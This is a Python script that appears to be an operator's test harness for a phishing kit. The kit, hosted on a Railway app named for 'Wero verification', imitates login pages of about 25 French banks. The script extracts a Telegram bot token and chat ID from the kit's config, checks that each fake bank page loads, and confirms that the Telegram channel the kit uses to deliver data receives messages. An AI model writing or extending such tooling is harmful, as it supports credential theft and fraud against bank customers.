import requests
import re
from datetime import datetime

RAILWAY_URL = "https://weroverificationeu-production.up.railway.app"
TEST_PAGE = f"{RAILWAY_URL}/test_manual.html"

# Toutes les banques disponibles
ALL_BANKS = [
    "bank.html",
    "banque-populaire.html",
    "banque-postale.html",
    "bcp.html",
    "bnp.html",
    "bred.html",
    "caisse-epargne.html",
    "cartes.html",
    "cic.html",
    "cooperatif.html",
    "credit-agricole.html",
    "credit-mutuel.html",
    "dupuy.html",
    "fortuneo.html",
    "hello-bank.html",
    "lcl.html",
    "maritime.html",
    "marze.html",
    "monabanq.html",
    "nickel.html",
    "palatine.html",
    "populaire.html",
    "savoie.html",
    "societe-generale.html",
    "wero.html"
]

# Banques testees precedemment
TESTED_BANKS = [
    "bred.html",
    "bnp.html",
    "lcl.html",
    "societe-generale.html",
    "credit-agricole.html",
    "credit-mutuel.html",
    "banque-populaire.html",
    "caisse-epargne.html",
]

print("=" * 70)
print("WERO TELEGRAM - COMPLETE BANK TEST")
print("=" * 70)
print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print()

# Extract tokens
print("[1/3] Extracting Telegram tokens...")
try:
    response = requests.get(TEST_PAGE, timeout=10)
    config_pattern = r'window\.telegramConfig\s*=\s*\{([^}]+)\}'
    match = re.search(config_pattern, response.text, re.DOTALL)
    bot_token = re.search(r'BOT_TOKEN:\s*["\']([^"\']+)["\']', match.group(1)).group(1)
    chat_id = re.search(r'CHAT_ID:\s*["\'](\d+)["\']', match.group(1)).group(1)
    print("[OK] Tokens extracted")
except Exception as e:
    print(f"[ERROR] {e}")
    exit(1)

print()
print("[2/3] Testing ALL bank pages...")
print()

tg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

working = []
failed = []
not_tested = []

for bank in sorted(ALL_BANKS):
    bank_name = bank.replace(".html", "").replace("-", " ").upper()
    bank_url = f"{RAILWAY_URL}/{bank}"
    
    try:
        page_response = requests.get(bank_url, timeout=5)
        
        if page_response.status_code == 200:
            # Send test to Telegram
            message = f"BANK: {bank_name}\nStatus: OK\nURL: {bank}\nTime: {datetime.now().strftime('%H:%M:%S')}"
            payload = {"chat_id": chat_id, "text": message}
            tg_response = requests.post(tg_url, json=payload, timeout=5)
            
            if tg_response.json().get('ok'):
                if bank in TESTED_BANKS:
                    print(f"[TESTED] {bank_name}")
                    working.append(bank)
                else:
                    print(f"[NEW] {bank_name}")
                    working.append(bank)
                    not_tested.append(bank)
            else:
                print(f"[FAIL-TG] {bank_name}")
                failed.append(bank)
        else:
            print(f"[FAIL-HTTP] {bank_name} ({page_response.status_code})")
            failed.append(bank)
    except Exception as e:
        print(f"[ERROR] {bank_name} - {str(e)[:30]}")
        failed.append(bank)

print()
print("[3/3] Summary")
print("=" * 70)
print()
print(f"Total Banks: {len(ALL_BANKS)}")
print(f"Working: {len(working)}")
print(f"Failed: {len(failed)}")
print(f"Previously Tested: {len(TESTED_BANKS)}")
print(f"Newly Tested: {len(not_tested)}")
print()

if not_tested:
    print("NEW BANKS TESTED:")
    for bank in not_tested:
        bank_name = bank.replace(".html", "").replace("-", " ").upper()
        print(f"  [OK] {bank_name}")

if failed:
    print()
    print("FAILED BANKS:")
    for bank in failed:
        bank_name = bank.replace(".html", "").replace("-", " ").upper()
        print(f"  [FAIL] {bank_name}")

print()
print("=" * 70)
print("COMPLETE TEST FINISHED")
print("Check Telegram for all test messages")
print("=" * 70)
